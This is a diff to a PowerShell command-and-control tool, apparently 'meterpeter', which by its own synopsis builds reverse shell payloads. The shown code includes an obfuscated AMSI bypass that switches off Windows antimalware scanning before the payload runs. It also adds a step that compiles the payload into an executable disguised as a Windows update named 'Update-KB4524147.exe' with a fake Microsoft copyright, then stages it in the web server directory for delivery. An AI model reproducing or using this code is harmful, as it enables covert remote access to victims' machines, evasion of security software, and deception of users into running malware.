@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
   Starts a listener Server on a Windows|Linux attacker machine and generate oneline reverse shell payloads (PS)
 
@@ -40,6 +40,9 @@
 
 ## Meterpeter Develop version
 $dev_Version = "2.10.6";
+# Auto-Convertion of Client.ps1 to standalone executable
+$Converter = $False
+
 
 function Character_Obfuscation($String)
 {
@@ -299,6 +302,21 @@ Start-Sleep -Seconds 2;
 # Copy payload to apache2 to trigger attack vector.
 $Amsi_Bypass = Character_Obfuscation("(([Ref].Assembly.gettypes() | ? {`$_.Name -like `"Amsi*tils`"}).GetFields(`"NonPublic,Static`") | ? {`$_.Name -like `"amsiInit*ailed`"}).SetValue(`$null,`$true);");
 $My_Output = "$Amsi_Bypass"+"$PowerShell_Payload" | Out-File -FilePath $IPATH$payload_name.ps1 -Force;
+
+
+## TODO: New function
+# Auto-Convertion of Client.ps1 to standalone executable
+$PS2EXE = $env:OS
+If($Converter -eq $True -and $PS2EXE -eq 'Windows_NT'){
+    Write-Host "   Auto-Convertion of $payload_name.ps1 to standalone executable" -ForeGroundColor Green
+    $Convertor = "$IPATH"+"PS2EXE";cd $Convertor
+    Copy-Item -Path $IPATH$payload_name.ps1 -Destination $payload_name.ps1 -Force -ErrorAction SilentlyContinue;
+    .\ps2exe.ps1 -inputFile 'Update-KB4524147.ps1' -outputFile 'Update-KB4524147.exe' -iconFile 'meterpeter.ico' -title 'meterpeter binary file' -version '2.10.6' -description 'meterpeter binary file' -product 'meterpeter C2' -copyright 'Microsoft® Windows® Operative System' -noConsole -noVisualStyles -noError
+    Copy-Item -Path Update-KB4524147.exe -Destination $IPATH$payload_name.exe -Force -ErrorAction SilentlyContinue;
+    Remove-Item -Path Update-KB4524147.exe -Force -ErrorAction SilentlyContinue
+    cd $IPATH
+  }
+   
 $check = Test-Path -Path "/var/www/html/";
 If($check -eq $False)
 {
